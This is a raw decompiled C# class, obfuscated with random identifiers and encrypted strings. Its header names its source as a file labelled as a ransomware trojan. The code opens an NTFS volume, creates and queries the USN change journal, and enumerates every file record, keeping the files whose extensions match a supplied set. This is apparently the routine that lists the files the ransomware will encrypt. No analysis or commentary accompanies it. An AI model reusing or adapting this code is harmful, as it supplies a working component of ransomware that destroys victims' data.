// Decompiled with JetBrains decompiler
// Type: HxobVrDuhJbMYt.MlaUJHhJrSKE
// Assembly: sloc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8380720F-5D35-42C0-94D8-715B8457E8C4
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.Win32.Generic-39a044db72d3ca39122af249cd60660d7e200366af958c762910605eaed020cb.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace HxobVrDuhJbMYt
{
  public sealed class MlaUJHhJrSKE
  {
    [NonSerialized]
    internal static GetString \u0006;

    public void wByqwxhiyFl(
      string zSsKQkKCrFeIypmWZ,
      HashSet<string> JiutUDZUZXBN,
      out Dictionary<ulong, vDHOYTKrzyM> yAOhyjqrEHfWtaCa,
      out Dictionary<ulong, vDHOYTKrzyM> itivqyGNUYVHKq)
    {
      itivqyGNUYVHKq = new Dictionary<ulong, vDHOYTKrzyM>();
      yAOhyjqrEHfWtaCa = new Dictionary<ulong, vDHOYTKrzyM>();
      IntPtr zero = IntPtr.Zero;
      IntPtr fuLaEOMajtqW = IntPtr.Zero;
      try
      {
        this.xXtYReCERGisdF(zSsKQkKCrFeIypmWZ, itivqyGNUYVHKq);
        this.bIkiMWVmMe(zSsKQkKCrFeIypmWZ, out fuLaEOMajtqW);
        this.ihUgGGEjMzCtR(fuLaEOMajtqW);
        this.tFmZgkPiKJbbcQZ(ref zero, fuLaEOMajtqW);
        this.YkozDIENKgfDl(zero, ref yAOhyjqrEHfWtaCa, JiutUDZUZXBN, itivqyGNUYVHKq, fuLaEOMajtqW);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message, (object) ex);
        for (Exception innerException = ex.InnerException; innerException != null; innerException = innerException.InnerException)
          Console.WriteLine(innerException.Message, (object) innerException);
        throw new ApplicationException(MlaUJHhJrSKE.\u0006(107409027), ex);
      }
      finally
      {
        if (fuLaEOMajtqW.ToInt32() != -1)
          WOUSvMaKfSyhnht.jqIYQmPIfxS(fuLaEOMajtqW);
        if (zero != IntPtr.Zero)
          Marshal.FreeHGlobal(zero);
      }
    }

    private void xXtYReCERGisdF([In] string obj0, [In] Dictionary<ulong, vDHOYTKrzyM> obj1)
    {
      string str = MlaUJHhJrSKE.\u0006(107408990) + obj0 + (object) Path.DirectorySeparatorChar;
      IntPtr num = WOUSvMaKfSyhnht.erprTwjPHKu(str, 0U, 3U, IntPtr.Zero, 3U, 33554432U, IntPtr.Zero);
      if (num.ToInt32() == -1)
        return;
      WOUSvMaKfSyhnht.WAANxQkDJvO BgxSmxnZQJSZRnq = new WOUSvMaKfSyhnht.WAANxQkDJvO();
      if (WOUSvMaKfSyhnht.iBxfvLKtTHjOle(num, out BgxSmxnZQJSZRnq))
      {
        ulong key = (ulong) BgxSmxnZQJSZRnq.HtVebOulCGg << 32 | (ulong) BgxSmxnZQJSZRnq.EXXShcTKkwwObl;
        vDHOYTKrzyM vDhoytKrzyM = new vDHOYTKrzyM(str, 0UL);
        obj1.Add(key, vDhoytKrzyM);
      }
      WOUSvMaKfSyhnht.jqIYQmPIfxS(num);
    }

    private void bIkiMWVmMe(string WbNSdLdhxAjK, out IntPtr fuLaEOMajtqW)
    {
      string str = MlaUJHhJrSKE.\u0006(107408990) + WbNSdLdhxAjK;
      fuLaEOMajtqW = WOUSvMaKfSyhnht.erprTwjPHKu(str, 3221225472U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
    }

    private void YkozDIENKgfDl(
      [In] IntPtr obj0,
      [In] ref Dictionary<ulong, vDHOYTKrzyM> obj1,
      [In] HashSet<string> obj2,
      [In] Dictionary<ulong, vDHOYTKrzyM> obj3,
      [In] IntPtr obj4)
    {
      IntPtr num1 = Marshal.AllocHGlobal(65544);
      WOUSvMaKfSyhnht.lojdrMUApk(num1, 65544);
      uint wovtcCSHQaz = 0;
      while (WOUSvMaKfSyhnht.IPXGpWjvWAKwXKrUXk(obj4, 590003U, obj0, sizeof (WOUSvMaKfSyhnht.dSJwACSETVbtC), num1, 65544, out wovtcCSHQaz, IntPtr.Zero))
      {
        IntPtr num2 = new IntPtr(num1.ToInt32() + 8);
        WOUSvMaKfSyhnht.SsEvFJslIcFio ssEvFjslIcFio;
        for (; wovtcCSHQaz > 60U; wovtcCSHQaz -= ssEvFjslIcFio.VsygIJSpySlH)
        {
          ssEvFjslIcFio = new WOUSvMaKfSyhnht.SsEvFJslIcFio(num2);
          if (0 != ((int) ssEvFjslIcFio.uiDngBrIucD & 16))
          {
            if (obj3.ContainsKey(ssEvFjslIcFio.WLRgNPtunaMZKU))
              throw new Exception(string.Format(MlaUJHhJrSKE.\u0006(107408981), (object) ssEvFjslIcFio.WLRgNPtunaMZKU, (object) ssEvFjslIcFio.YEBKuKykjSz));
            obj3.Add(ssEvFjslIcFio.WLRgNPtunaMZKU, new vDHOYTKrzyM(ssEvFjslIcFio.YEBKuKykjSz, ssEvFjslIcFio.QYESlNsOGSZe));
          }
          else
          {
            bool flag = true;
            if (obj2 != null)
            {
              string extension = Path.GetExtension(ssEvFjslIcFio.YEBKuKykjSz);
              flag = obj2.Contains(extension);
            }
            if (flag)
            {
              if (!obj1.ContainsKey(ssEvFjslIcFio.WLRgNPtunaMZKU))
              {
                obj1.Add(ssEvFjslIcFio.WLRgNPtunaMZKU, new vDHOYTKrzyM(ssEvFjslIcFio.YEBKuKykjSz, ssEvFjslIcFio.QYESlNsOGSZe));
              }
              else
              {
                vDHOYTKrzyM vDhoytKrzyM = obj1[ssEvFjslIcFio.WLRgNPtunaMZKU];
                if (0 != string.Compare(ssEvFjslIcFio.YEBKuKykjSz, vDhoytKrzyM.get_Name(), true))
                {
                  Console.WriteLine(MlaUJHhJrSKE.\u0006(107408912), (object) ssEvFjslIcFio.WLRgNPtunaMZKU, (object) ssEvFjslIcFio.YEBKuKykjSz, (object) vDhoytKrzyM.get_Name());
                  throw new Exception(string.Format(MlaUJHhJrSKE.\u0006(107408981), (object) ssEvFjslIcFio.WLRgNPtunaMZKU, (object) ssEvFjslIcFio.YEBKuKykjSz));
                }
              }
            }
          }
          num2 = new IntPtr((long) num2.ToInt32() + (long) ssEvFjslIcFio.VsygIJSpySlH);
        }
        Marshal.WriteInt64(obj0, Marshal.ReadInt64(num1, 0));
      }
      Marshal.FreeHGlobal(num1);
    }

    private void ihUgGGEjMzCtR([In] IntPtr obj0)
    {
      ulong num1 = 8388608;
      ulong num2 = 1048576;
      WOUSvMaKfSyhnht.xGupZZOPoPxAnTg structure;
      structure.fEgBJqmvnsXT = num1;
      structure.GCyLaDAbZISQ = num2;
      int num3 = Marshal.SizeOf<WOUSvMaKfSyhnht.xGupZZOPoPxAnTg>(structure);
      IntPtr num4 = Marshal.AllocHGlobal(num3);
      WOUSvMaKfSyhnht.lojdrMUApk(num4, num3);
      Marshal.StructureToPtr<WOUSvMaKfSyhnht.xGupZZOPoPxAnTg>(structure, num4, true);
      WOUSvMaKfSyhnht.IPXGpWjvWAKwXKrUXk(obj0, 590055U, num4, num3, IntPtr.Zero, 0, out uint _, IntPtr.Zero);
    }

    private void tFmZgkPiKJbbcQZ([In] ref IntPtr obj0, [In] IntPtr obj1)
    {
      uint BXCkPINuODrA = 0;
      WOUSvMaKfSyhnht.HTaMExqdETGNm kayLyvqcvkJPoX = new WOUSvMaKfSyhnht.HTaMExqdETGNm();
      if (!WOUSvMaKfSyhnht.HODCfnMJSdKz(obj1, 590068U, IntPtr.Zero, 0, out kayLyvqcvkJPoX, sizeof (WOUSvMaKfSyhnht.HTaMExqdETGNm), out BXCkPINuODrA, IntPtr.Zero))
        return;
      WOUSvMaKfSyhnht.dSJwACSETVbtC structure;
      structure.FnQYdLJBXxxIR = 0UL;
      structure.VOyoeiCCTO = 0L;
      structure.PJuaqdWNUllGYR = kayLyvqcvkJPoX.hBLAirbZyQeW;
      int cb = Marshal.SizeOf<WOUSvMaKfSyhnht.dSJwACSETVbtC>(structure);
      obj0 = Marshal.AllocHGlobal(cb);
      WOUSvMaKfSyhnht.lojdrMUApk(obj0, cb);
      Marshal.StructureToPtr<WOUSvMaKfSyhnht.dSJwACSETVbtC>(structure, obj0, true);
    }

    static MlaUJHhJrSKE() => Strings.CreateGetStringDelegate(typeof (MlaUJHhJrSKE));
  }
}
